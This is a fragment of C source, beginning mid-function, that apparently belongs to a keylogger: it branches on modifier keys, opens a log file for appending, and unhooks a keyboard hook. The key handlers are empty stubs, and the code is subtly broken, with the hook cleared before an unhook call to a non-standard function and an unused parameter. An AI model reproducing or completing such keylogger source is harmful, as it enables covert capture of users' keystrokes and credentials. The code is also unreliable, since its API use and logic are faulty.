            }
        }
        if (bKey == 0x10) { // Ctrl key
            // Handle Ctrl key
        }
        if (bKey == 0x20) { // Shift key
            // Handle Shift key
        }
        if (bKey == 0x40) { // Alt key
            // Handle Alt key
        }
        // Handle other keys as needed
    }
}

void createfile() {
    if (filehandle == NULL) {
        filehandle = fopen(LOG_FILE, "a");
        if (filehandle == NULL) {
            printf("Error creating log file\n");
        }
    }
}

void removehook(HHOOK hhook) {
    if (hook != 0) {
        hook = 0;
        Unhook(hook);
    }
}
